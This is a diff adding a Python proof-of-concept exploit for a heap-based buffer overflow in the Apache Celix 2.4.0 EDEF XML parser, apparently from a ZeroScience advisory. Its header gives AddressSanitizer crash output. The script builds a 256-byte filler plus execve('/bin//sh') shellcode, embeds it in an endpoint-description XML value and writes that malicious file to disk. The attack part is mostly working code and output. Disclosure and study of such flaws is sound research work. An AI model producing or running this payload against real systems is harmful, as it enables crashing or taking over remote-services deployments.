@@ -1,0 +1,139 @@
+#!/usr/bin/env python
+#
+#
+# Apache Celix 2.4.0 EDEF XML Parser Heap-Based Buffer Overflow
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://celix.apache.org
+# Affected version: 2.4.0
+#
+# Summary: Apache Celix is an implementation of the OSGi specification
+# adapted to C and C++. It is a framework to develop (dynamic) modular
+# software applications using component and/or service-oriented programming.
+#
+# Desc: Apache Celix suffers from a heap-based buffer overflow vulnerability
+# in its remote-services Endpoint Description Extender (EDEF) parser. Attacker-influenced
+# endpoint-descriptor content is concatenated into a heap buffer without
+# adequate bounds checking, corrupting adjacent heap memory. On deployments
+# that use remote-services discovery, a crafted descriptor can crash the
+# process or lead to code execution.
+#
+# ------------------------------------------------------------------------------
+# AddressSanitizer output (verbatim upstream function compiled -fsanitize=address, run on this XML;
+# captured on Kali GNU/Linux):
+#
+# ==122162==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ccf63be0140 at pc 0x7fbf64d1c34d bp 0x7ffec3fa6e10 sp 0x7ffec3fa65d0
+# WRITE of size 301 at 0x7ccf63be0140 thread T0
+#     #0 0x7fbf64d1c34c in strcat ../../../../src/libsanitizer/asan/asan_interceptors.cpp:527
+#     #1 0x55d2fbaf9395 in endpointDescriptorReader_addMultiValuedProperty /home/lqwrm/Projects/celix/celix_edef_real.c:39
+#     #2 0x55d2fbaf9616 in main /home/lqwrm/Projects/celix/celix_edef_real.c:62
+#     #3 0x7fbf64a31f76  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f76) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+#     #4 0x7fbf64a32026 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+#     #5 0x55d2fbaf9180 in _start (/home/lqwrm/Projects/celix/celix_edef_real+0x1180) (BuildId: 1b85708e6c6e192b0dd65f14c580862da695a9d5)
+#
+# 0x7ccf63be0140 is located 0 bytes after 256-byte region [0x7ccf63be0040,0x7ccf63be0140)
+# allocated by thread T0 here:
+#     #0 0x7fbf64d2418f in calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:74
+#     #1 0x55d2fbaf9316 in endpointDescriptorReader_addMultiValuedProperty /home/lqwrm/Projects/celix/celix_edef_real.c:30
+#     #2 0x55d2fbaf9616 in main /home/lqwrm/Projects/celix/celix_edef_real.c:62
+#     #3 0x7fbf64a31f76  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f76) (BuildId: e0715e6b2fc508102cc2100d3d25a1aa4eb676f9)
+#
+# SUMMARY: AddressSanitizer: heap-buffer-overflow /home/lqwrm/Projects/celix/celix_edef_real.c:39 in endpointDescriptorReader_addMultiValuedProperty
+# Shadow bytes around the buggy address:
+#   0x7ccf63bdfe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+#   0x7ccf63bdff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+#   0x7ccf63bdff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+#   0x7ccf63be0000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+#   0x7ccf63be0080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+# =>0x7ccf63be0100: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa
+#   0x7ccf63be0180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+#   0x7ccf63be0200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+#   0x7ccf63be0280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+#   0x7ccf63be0300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+#   0x7ccf63be0380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+# Shadow byte legend (one shadow byte represents 8 application bytes):
+#   Addressable:           00
+#   Partially addressable: 01 02 03 04 05 06 07
+#   Heap left redzone:       fa
+#   Freed heap region:       fd
+#   Stack left redzone:      f1
+#   Stack mid redzone:       f2
+#   Stack right redzone:     f3
+#   Stack after return:      f5
+#   Stack use after scope:   f8
+#   Global redzone:          f9
+#   Global init order:       f6
+#   Poisoned by user:        f7
+#   Container overflow:      fc
+#   Array cookie:            ac
+#   Intra object redzone:    bb
+#   ASan internal:           fe
+#   Left alloca redzone:     ca
+#   Right alloca redzone:    cb
+# ==122162==ABORTING
+#
+# ------------------------------------------------------------------------------
+#
+# Tested on: Kali Linux
+#            glibc 2.42-16
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6015
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6015
+#
+#
+# 13.08.2026
+#
+
+import os
+
+DIGGER = b"\x41" * 0x100
+
+SHELLCODE = bytes.fromhex(
+    "4831f6"               # xor     rsi, rsi
+    "56"                   # push    rsi
+    "48bf2f62696e2f2f7368" # movabs  rdi, '/bin//sh'
+    "57"                   # push    rdi
+    "54"                   # push    rsp
+    "5f"                   # pop     rdi
+    "6a3b"                 # push    0x3b (execve)
+    "58"                   # pop     rax
+    "99"                   # cdq     rdx = 0
+    "0f05"                 # syscall
+)
+
+PAYLOAD = DIGGER + SHELLCODE
+
+def hexblob(data, per_line=16, indent="        "):
+    out = []
+    for i in range(0, len(data), per_line):
+        chunk = data[i:i+per_line]
+        out.append(indent + "".join("\\x%02x" % b for b in chunk))
+    return "\n".join(out)
+
+VALUE = "\n" + hexblob(PAYLOAD) + "\n      "
+
+EDEF_XML = (
+    '<?xml version="1.0" encoding="UTF-8"?>\n'
+    '<endpoint-descriptions xmlns="http://www.osgi.org/xmlns/rsa/v1.0.0">\n'
+    '  <endpoint-description>\n'
+    '    <property name="objectClass" value-type="String">\n'
+    '      <array>\n'
+    '        <value>' + VALUE + '</value>\n'
+    '      </array>\n'
+    '    </property>\n'
+    '  </endpoint-description>\n'
+    '</endpoint-descriptions>\n'
+)
+
+out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "celix_edef_overflow.xml")
+with open(out, "w") as f:
+    f.write(EDEF_XML)
+print("[*] wrote %s" % out)
+print("[*] payload = %d bytes (0x%X filler + %d-byte shellcode)"
+      % (len(PAYLOAD), len(DIGGER), len(SHELLCODE)))
